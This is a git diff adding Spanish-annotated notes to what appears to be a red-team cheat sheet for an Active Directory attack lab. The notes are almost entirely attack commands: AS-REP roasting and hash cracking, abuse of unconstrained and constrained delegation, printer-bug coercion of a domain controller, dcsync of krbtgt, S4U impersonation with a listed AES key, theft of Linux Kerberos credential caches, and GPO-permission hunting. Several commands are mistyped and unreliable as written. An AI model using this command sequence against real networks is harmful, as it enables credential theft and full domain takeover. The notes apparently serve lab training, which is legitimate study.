@@ -599,7 +599,93 @@ $krb5tgs$23$*svc_mssql$dev.cyberbotic.io*$6A9E[blah]
 
 #ASREPROasting
 execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
+BloodHound
+MATCH (u:User {dontreqpreauth:true}) RETURN u
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap
+john --format=krb5asrep --wordlist=wordlist svc_oracle
+hascat -a 0 -m 18200 svc_oracle wordlist
+
+#UnConstrained Delegation
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
+powershell Get-DomainComputer -Unconstrained -Properties SamAccountName
+jump psexec64 srv-1 smb
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:user /interval:10
+make_token DEV\nlamb FakePass
+[System.IO.File]::WriteAllBytes("c:\ticket", [Sytem:Convert]::FromBase64String("pegar el tickekt sin espaciols"))
+kerberos_ticket_use C:\ticket
  
+#PrinterBug
+Si la maquina B se configura sin restrincciones nos permitiar captar el TGT de la maquina A
+srv1
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap
+wkstin-1
+execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-2 srv-1
+make_token DEV\DC-2$ FakePass
+kerberos_ticket_use C:\Users\Administrator\Desktop\dc-2.kirbi
+dcsync dev.cyberbotic.io DEV\krbtgt
+
+#Constrained Delegation
+Le permite pedir un TGS para otro usuario con su propio TGT
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
+BloodHound
+MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
+srv2
+mimikatz sekurlsa::ekeys
+execute-assembly c:\Rubeus.exe triage 
+execute-assembly c:\Rubeus.exe dmp /luid:0x3e4 /service:krgtgt /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt
+[System.IO.File]::WriteAllBytes("c:\ticket", [Sytem:Convert]::FromBase64String("pegar el tickekt sin espaciols"))
+make_token DEV\nlamb Fake
+kerberos_ticket_use ticket.kirbi
+
+#AlternateServiceName
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt
+tgt
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /ticket:ticket /norwap
+[System.IO.File]::WriteAllBytes("c:\ticket", [Sytem:Convert]::FromBase64String("pegar el tickekt sin espaciols"))
+make_token DEV\nlamb Fake
+kerberos_ticket_use c:\ticket.kirbi
+
+#LinuxCredentialCache
+sh 10.10.17.12:22 svc_oracle Passw0rd!
+ls -l /tmp/
+sudo -l
+sudo -i
+sudo chmod 777 ticket
+impacket-ticketConverter krb5cc_1394201122_MerMmG jking.kirbi
+proxychains scp root@maquina:/loquequiero .
+make_token DEV\jking FakePass
+kerberos_ticket_use C:\Users\Administrator\Desktop\jking.kirbi
+
+#GPO
+WriteProperty , WriteDacl o WriteOwner
+La directiva de grupo es el repositorio central de un bosque o dominio que controla la configuración de equipos y usuarios. 
+Los objetos de directiva de grupo (GPO) son conjuntos de configuraciones que se aplican a las unidades organizativas (OU). 
+A todos los usuarios u ordenadores que sean miembros de la unidad organizativa se les aplicarán esas configuraciones.
+Crear GPO
+Modificar GPO existentes
+Vincular GPO a OU
+powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
+powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
+powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
+powershell Get-DomainComputer | ? { $_.DistinguishedName -match "OU=Tier 1" } | select DnsHostName
+powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126
+powershell Get-DomainGPO -Name "{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}" -Properties DisplayName
+MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p
+
+#PivotLosteners
+Usa TCP pero al reves
+Es independiente sin tener que conectarse
+Pivoting>Listener
+run netstat -anp tcp
+netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444
+netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444
+
+
+
+
+
 
 
 
